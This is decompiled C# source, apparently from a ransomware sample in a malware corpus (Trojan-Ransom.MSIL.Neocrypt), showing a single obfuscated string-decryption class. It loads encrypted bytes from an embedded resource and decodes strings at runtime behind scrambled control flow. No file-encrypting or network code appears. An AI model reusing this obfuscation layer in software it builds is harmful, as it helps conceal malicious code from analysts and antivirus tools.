// Decompiled with JetBrains decompiler
// Type: #0b.#Zb
// Assembly: LoadAssembly, Version=0.0.0.0, Culture=neutral, PublicKeyToken=489de906037d8a94
// MVID: B46B9881-0285-4729-849C-7A9813852236
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.MSIL.Neocrypt.c-d581e010b258e8f3cf3f45557eb29795dc6fc39a9eccfcbf12c2b372afcb6e03.exe

using \u00230b;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u00230b
{
  internal class \u0023Zb
  {
    private static string \u0023Tb = "0";
    private static string \u0023Ub = "229";
    private static byte[] \u0023Vb;
    private static Hashtable \u0023Db;
    private static bool \u0023Wb;
    private static int \u0023Xb;

    [\u00231b]
    [\u00232b]
    public static string \u0023Yb([In] int obj0)
    {
      int num1 = obj0;
      int num2;
      int num3;
      string str1;
      int num4;
      while (true)
      {
        int xb = \u0023Zb.\u0023Xb;
        int num5 = num1 - xb;
        if (true)
          goto label_19;
label_2:
        if (\u0023Zb.\u0023Wb)
        {
          str1 = (string) \u0017.\u007E\u0019((object) \u0023Zb.\u0023Db, (object) obj0);
          switch (str1)
          {
            case null:
              break;
            default:
              goto label_20;
          }
        }
        int num6 = 0;
        if (num6 == 0)
          goto label_21;
label_9:
        if ((num6 & 64) != 0)
        {
          int num7 = (num3 & 31) << 24;
          byte[] vb1 = \u0023Zb.\u0023Vb;
          int index1 = num2;
          int num8 = index1 + 1;
          int num9 = (int) vb1[index1] << 16;
          int num10 = num7 + num9;
          byte[] vb2 = \u0023Zb.\u0023Vb;
          int index2 = num8;
          int num11 = index2 + 1;
          int num12 = (int) vb2[index2] << 8;
          int num13 = num10 + num12;
          byte[] vb3 = \u0023Zb.\u0023Vb;
          int index3 = num11;
          num2 = index3 + 1;
          int num14 = (int) vb3[index3];
          num4 = num13 + num14;
          if (false)
          {
            num1 = num4;
            continue;
          }
          goto label_12;
        }
        else
          goto label_10;
label_21:
        num2 = obj0;
        if (true)
        {
          num3 = (int) \u0023Zb.\u0023Vb[num2++];
          if ((num3 & 128) == 0)
            break;
        }
        num6 = num3;
        goto label_9;
label_19:
        obj0 = num5;
        goto label_2;
      }
      int num15 = num3;
      if (num15 == 0)
        return string.Empty;
      goto label_13;
label_10:
      num15 = ((num3 & 63) << 8) + (int) \u0023Zb.\u0023Vb[num2++];
      goto label_13;
label_12:
      num15 = num4;
label_13:
      try
      {
        byte[] numArray = \u001A.\u001C(\u0019.\u007E\u001B((object) \u0018.\u001A(), \u0023Zb.\u0023Vb, num2, num15));
        string str2 = \u001B.\u001D(\u0019.\u007E\u001B((object) \u0018.\u001A(), numArray, 0, numArray.Length));
        if (\u0023Zb.\u0023Wb)
        {
          try
          {
            \u001C.\u007E\u001E((object) \u0023Zb.\u0023Db, (object) obj0, (object) str2);
          }
          catch
          {
          }
        }
        return str2;
      }
      catch
      {
        return (string) null;
      }
label_20:
      return str1;
    }

    static \u0023Zb()
    {
      int num1;
      if (true)
      {
        \u0023Zb.\u0023Vb = (byte[]) null;
        \u0023Zb.\u0023Db = (Hashtable) null;
        \u0023Zb.\u0023Wb = false;
        num1 = 0;
      }
      else
        goto label_4;
label_2:
      int num2;
      if (num1 == 0)
      {
        \u0023Zb.\u0023Xb = num1;
      }
      else
      {
        num2 = num1;
        goto label_5;
      }
label_4:
      num2 = \u001D.\u001F(\u0023Zb.\u0023Tb, "1") ? 1 : 0;
label_5:
      if (num2 != 0)
      {
        if (false)
          return;
        \u0023Zb.\u0023Wb = true;
        \u0023Zb.\u0023Db = new Hashtable();
      }
      num1 = \u001E.\u007F(\u0023Zb.\u0023Ub);
      if (true)
      {
        \u0023Zb.\u0023Xb = num1;
        Assembly assembly = \u001F.\u0080();
        Stream stream = \u007F.\u007E\u0081((object) assembly, "{f9311cfa-fae4-4eef-a5a4-0cd26f6e1792}");
        try
        {
          int length = \u0081.\u0083(\u0080.\u007E\u0082((object) stream));
          \u0023Zb.\u0023Vb = new byte[length];
          do
          {
            int num3 = \u0082.\u007E\u0084((object) stream, \u0023Zb.\u0023Vb, 0, length);
            \u000E.\u007E\u000F((object) stream);
          }
          while (false);
        }
        finally
        {
          if (stream != null)
            \u000E.\u007E\u0010((object) stream);
        }
      }
      else
        goto label_2;
    }
  }
}
